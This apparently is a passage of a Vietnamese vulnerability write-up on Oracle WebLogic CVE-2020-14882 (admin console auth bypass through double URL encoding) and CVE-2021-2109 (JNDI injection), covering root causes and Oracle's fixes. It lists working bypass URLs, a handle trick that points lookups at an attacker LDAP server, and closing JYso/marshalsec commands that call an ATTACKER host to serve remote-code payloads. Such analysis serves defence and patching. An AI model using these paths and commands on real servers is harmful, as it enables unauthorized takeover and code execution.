    //               ^^^^
    //               vẫn bắt đầu bằng /css/ → match pattern /css/*

// Local variable table (từ bytecode debug info):
//   Slot 1: relURI (String)           — relative URI đã decode 1 lần
//   Slot 2: method (String)           — HTTP method (GET/POST/...)
//   Slot 3: consForAllMethods         — StandardURLMapping cho mọi HTTP method
//   Slot 4: consForOneMethod          — StandardURLMapping cho method cụ thể
//   Slot 5: rcForAllMethods           — ResourceConstraint match từ consForAllMethods
//   Slot 6: rcForOneMethod            — ResourceConstraint match từ consForOneMethod
private ResourceConstraint getConstraint(String relURI, String method) {
    // constraintsMap: HashMap<String, StandardURLMapping>
    // key "" → patterns áp dụng cho mọi HTTP method
    // key "GET"/"POST"/... → patterns chỉ áp dụng cho method đó
    
    // consForAllMethods.matchMap chứa trie từ web.xml patterns:
    //   "/css/"    → Node(UNRESTRICTED)           (từ /css/*)
    //   "/css"     → FullMatchNode(UNRESTRICTED)  (từ /css/*)
    //   "/images/" → Node(UNRESTRICTED)           (từ /images/*)
    //   "/"        → default mapping (requires Admin/Operator/...)
    StandardURLMapping consForAllMethods = constraintsMap.get("");          // offset 13-21
    StandardURLMapping consForOneMethod = constraintsMap.get(method);       // offset 26-33

    ResourceConstraint rcForAllMethods = consForAllMethods.get(relURI);     // offset 45
    ResourceConstraint rcForOneMethod = consForOneMethod.get(relURI);       // offset 65

    // → Node.match() → return UNRESTRICTED (vô điều kiện)

    if (rcForAllMethods == null && rcForOneMethod == null) return null;     // offset 73-84
    if (rcForAllMethods == null) return rcForOneMethod;                     // offset 85-97
    if (rcForOneMethod == null) return rcForAllMethods;                     // offset 98-110
    // Nếu cả 2 cùng resourceId → ưu tiên method-specific:

### 1.3. Root Cause

Kết hợp hai yếu tố: **double URL encoding** bypass security-constraint, và **mismatch giữa security matching (path prefix) với servlet dispatch (extension)**.

#### 1.3.1. Security-constraint: static resource paths không cần auth

`web.xml` cấu hình các path serve static files (CSS, images, JS) **không yêu cầu auth** — vì chúng **không có servlet xử lý logic**, chỉ serve file tĩnh:

```xml
<!-- KHÔNG CÓ <auth-constraint> → UNRESTRICTED (ai cũng truy cập được) -->
<security-constraint>
    <web-resource-collection>
      <web-resource-name>images</web-resource-name>
      <url-pattern>/images/*</url-pattern>                              <!-- static images -->
    </web-resource-collection>
    <web-resource-collection>
      <web-resource-name>common</web-resource-name>
      <url-pattern>/common/*</url-pattern>                              <!-- static common -->
    </web-resource-collection>
    <web-resource-collection>
      <web-resource-name>css</web-resource-name>
      <url-pattern>/css/*</url-pattern>                                 <!-- static CSS -->
      <url-pattern>/framework/skeletons/wlsconsole/css/*</url-pattern>
      <url-pattern>/framework/skeletons/wlsconsole/js/*</url-pattern>
      <url-pattern>/framework/skins/wlsconsole/css/*</url-pattern>
      <url-pattern>/framework/skins/wlsconsole/images/*</url-pattern>
    </web-resource-collection>
</security-constraint>

<!-- CÓ <auth-constraint> → yêu cầu login với role Admin/Operator/... -->
<security-constraint>
    <web-resource-collection>
      <web-resource-name>console</web-resource-name>
      <url-pattern>/</url-pattern>                                      <!-- mọi path khác -->
    </web-resource-collection>
    <auth-constraint>
      <role-name>Admin</role-name>
      <role-name>Operator</role-name>
      <role-name>Deployer</role-name>
      <role-name>Monitor</role-name>
    </auth-constraint>
</security-constraint>
```

**Chú ý**: các path `/css/*`, `/images/*` **không có `<servlet-mapping>` riêng** — chúng được serve bởi default servlet (file tĩnh). Không có servlet nào xử lý business logic trên các path này.

#### 1.3.2. Servlet mapping: extension `*.portal` → AppManagerServlet

Tuy nhiên, `web.xml` cũng cấu hình **extension-based** servlet mapping:

#### 1.3.3. Mismatch: security check vs servlet dispatch

Đây là root cause chính — hai hệ thống matching **hoạt động trên cùng URL nhưng dùng tiêu chí khác nhau**:

| Hệ thống | Matching | URL `/css/%2e%2e%2fconsole.portal` | Kết quả |
|-----------|----------|-------------------------------------|---------|
| **Security constraint** (`WebAppSecurityWLS`) | **Path prefix** match | `/css/...` → match `/css/*` | **UNRESTRICTED** (no auth) |
| **Servlet dispatch** (`WebAppServletContext`) | **Extension** match | `*.portal` → match `*.portal` | **AppManagerServlet** (renders portal) |

Bình thường không có vấn đề: request tới `/css/style.css` vừa match `/css/*` (no auth) vừa không match `*.portal` (serve static file). Request tới `/console.portal` match `*.portal` (AppManagerServlet) vừa match `/` (requires auth) → đúng.

**Nhưng với double encoding**: `/css/%2e%2e%2fconsole.portal` vừa match `/css/*` (path prefix → no auth) vừa match `*.portal` (extension → AppManagerServlet). Security check thấy static path → pass. Servlet dispatch thấy `.portal` → route đến `MBeanUtilsInitSingleFileServlet` → decode lần 2 → traverse ra `/console.portal` → render admin console **không cần auth**.

### 1.5. Các path bypass đã biết

```
/console/css/%252e%252e%252fconsole.portal
/console/images/%252e%252e%252fconsole.portal
/console/css/%25%32%65%25%32%65%25%32%66console.portal
/console/css/%252e%252e%252fconsolejndi.portal        (cho CVE-2021-2109)
```

Bypass dùng các path match security-constraint UNRESTRICTED **và không có path-based servlet-mapping** sẽ fallback dispatch theo extension `*.portal`:

| Path prefix | `<security-constraint>` | `<servlet-mapping>` | Bypass? |
|-------------|------------------------|---------------------|---------|
| `/css/*` | UNRESTRICTED (no auth) | **Không có** → extension match `*.portal` → AppManagerServlet | **Bypass** |
| `/images/*` | UNRESTRICTED (no auth) | **Không có** → extension match `*.portal` → AppManagerServlet | **Bypass** |
| `/common/*` | UNRESTRICTED (no auth) | **Có**: `JSPCServlet` (path match) | **Không bypass** — path-based mapping ưu tiên hơn extension, request dispatch tới `JSPCServlet` thay vì `AppManagerServlet` |
| `/framework/skeletons/wlsconsole/css/*` | UNRESTRICTED | **Có**: `FileDefault` (path match) | **Không bypass** — dispatch tới `FileDefault` |
| `/framework/skeletons/wlsconsole/js/*` | UNRESTRICTED | **Có**: `FileDefault` (path match) | **Không bypass** — dispatch tới `FileDefault` |

> `/common/*`  và các path tương tự không bypass được là vì theo Servlet spec (SRV.11.1), thứ tự ưu tiên servlet matching: (1) exact match → (2) **longest path prefix** `/common/*` → (3) extension `*.portal`. Vì `/common/*` có path-based mapping tới `JSPCServlet`, request `/common/%2e%2e%2fconsole.portal` sẽ dispatch tới `JSPCServlet` — không phải `AppManagerServlet` (`MBeanUtilsInitSingleFileServlet`), nên không trigger decode lần 2 trong `UIServletInternal.getTree()`.
>
> Chỉ `/css/*` và `/images/*` bypass được vì chúng **không có path-based servlet-mapping**, nên servlet container fallback xuống extension match `*.portal` → dispatch tới `AppManagerServlet`.

### 1.6. Cách Fix (Oracle Patch)

Oracle fix bằng cách:

1. **Normalize URL trước khi check security**: decode và resolve `../` TRƯỚC khi match URL pattern → security constraint
2. **Block double-encoded characters**: Reject request chứa `%25` trong path (encoded `%`)
3. **Thêm validation** trong `SingleFileServlet`: kiểm tra path traversal trước khi serve

### 1.7. Hạn chế của Auth Bypass

CVE-2020-14882 **chỉ bypass servlet security-constraint** (web.xml), **không tạo authenticated session**:

- `request.getUserPrincipal()` = null
- `principals = []` (empty)
- Không có admin session → các chức năng cần MBean access sẽ fail với `NoAccessRuntimeException`

### 2.3. Root Cause

`HandleFactory.getHandle()` nhận chuỗi handle từ HTTP parameter, parse tên class và argument, rồi instantiate class bằng reflection **mà không validate class nào được phép**.

Từ bytecode (offset 94 → 134):

```java
Class<?> clazz = Class.forName(className);              // load BẤT KỲ class nào
Constructor<?> ctor = clazz.getConstructor(String.class); // tìm constructor(String)
return (Handle) ctor.newInstance(args);                    // instantiate → side effect = RCE
```

Cast `(Handle)` xảy ra **SAU** `newInstance()` — constructor đã chạy xong rồi. Dù class không implement `Handle` interface, `ClassCastException` chỉ throw sau khi code trong constructor/static block đã execute.

Bất kỳ class nào:
- Có constructor nhận `String` parameter
- Constructor thực hiện dangerous operation (eval code, load remote resource, exec command)

→ Đều có thể bị weaponize.

### 2.4. Cách Fix (Oracle Patch)

Oracle fix bằng **whitelist** — `HandleFactory.getHandle()` chỉ cho phép instantiate các class thuộc package `com.bea.console.handles.*`. Mọi class ngoài whitelist bị reject.

### 4.3. Root Cause

`JNDIBindingAction.execute()` lấy JNDI context và binding name từ `JndiBindingHandle`, rồi gọi `InitialContext.lookup()` với giá trị do attacker kiểm soát — **không validate URL scheme** (`ldap://`, `rmi://`):

```java
// JNDIBindingAction.execute()  — key code
Object result = namingContext.lookup(context + binding);
//                                   ^^^^^^^^^^^^^^^^^
//                    attacker controls cả context và binding
//                    → JNDI URL injection → attacker LDAP/RMI server
```

**Handle parsing trick**: `HandleImpl.getComponents()` split bằng `;`:

```
Input:  "ldap://192.168.0;10:1389/path;AdminServer"
Split:  ["ldap://192.168.0", "10:1389/path", "AdminServer"]

context = "ldap://192.168.0"  + "."  →  "ldap://192.168.0."
binding = "10:1389/path"
lookup("ldap://192.168.0.10:1389/path")  ← valid LDAP URL, IP reconstructed
```

Dấu `;` dùng để chia IP thành components, `JNDIBindingAction` tự nối lại bằng `.` → reconstruct IP gốc.

### 4.4. Cách Fix (Oracle Patch)

Oracle fix bằng cách validate `context` và `binding` trong `JNDIBindingAction`:
- Block JNDI URL schemes (`ldap://`, `rmi://`, `iiop://`) trong giá trị lookup
- Sanitize input trước khi gọi `InitialContext.lookup()`

### 4.5. JNDI Injection — 2 kiểu tấn công

#### 4.5.1. Kiểu 1: Remote Codebase (Reference)

```
Victim                         Attacker
  |  lookup("ldap://...")        |
  |  ──────────────────────────► |  LDAP Server
  |  Reference(factory, codebase)|
  |  ◄────────────────────────── |
  |  GET /Evil.class             |
  |  ──────────────────────────► |  HTTP Server
  |  class bytes                 |
  |  ◄────────────────────────── |
  |  new Evil() → static block  |
  |  → RCE                      |
```

**Yêu cầu**: `com.sun.jndi.ldap.object.trustURLCodebase=true` (mặc định `false` từ JDK 8u191)

#### 4.5.2. Kiểu 2: Deserialization (javaSerializedData)

```
Victim                         Attacker
  |  lookup("ldap://...")        |
  |  ──────────────────────────► |  LDAP Server
  |  javaSerializedData: [bytes] |
  |  ◄────────────────────────── |
  |  readObject(bytes) → gadget  |
  |  → RCE                      |
```

**Không cần `trustURLCodebase`**. Cần gadget chain trong classpath victim.

### 4.6. Kết hợp CVE-2020-14882 + CVE-2021-2109

Dùng auth bypass path cho `consolejndi.portal`:

```http

Host: TARGET:7001
```

**Hạn chế khi chain với CVE-2020-14882**:

CVE-2020-14882 chỉ bypass web.xml security constraint, **không tạo authenticated session**. Khi `consolejndi.portal` render:
- `JNDIBindingAction.execute()` gọi `MBeanUtils.getAnyServerMBean(server)` → cần MBean access
- `principals = []` → `NoAccessRuntimeException`

Tuy nhiên, `JNDIBindingAction` vẫn có thể chạy nếu:
- Server name trong handle khớp đúng server instance (e.g., `AdminServer`)
- MBean access cho read-only lookup được phép ở mức lower privilege
- Một số version/config không enforce MBean check cho JNDI lookup

### 4.7. LDAP URL — Vấn đề DN hợp lệ

LDAP path phải là DN (Distinguished Name) hợp lệ. Route phức tạp có `/` (ví dụ `/Basic/Command/xxx`) sẽ gây error 34:

```
InvalidNameException: [LDAP: error code 34 - Unable to parse 'Basic/M-LF-/Evil.class' as a DN]
```

**Fix**: Dùng `setRoute` (JYso) hoặc marshalsec:

```bash
# JYso — set route qua HTTP, dùng DN đơn giản trong handle
curl "http://ATTACKER:3456/setRoute=deserialization/CommonsBeanutils2/command/base64/BASE64CMD"
# Handle: ldap://IP_PART;LAST:1389/dc=a;AdminServer

# marshalsec — trả Reference cho mọi DN
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER:8888/#Evil" 1389
# Handle: ldap://IP_PART;LAST:1389/dc=a;AdminServer
```
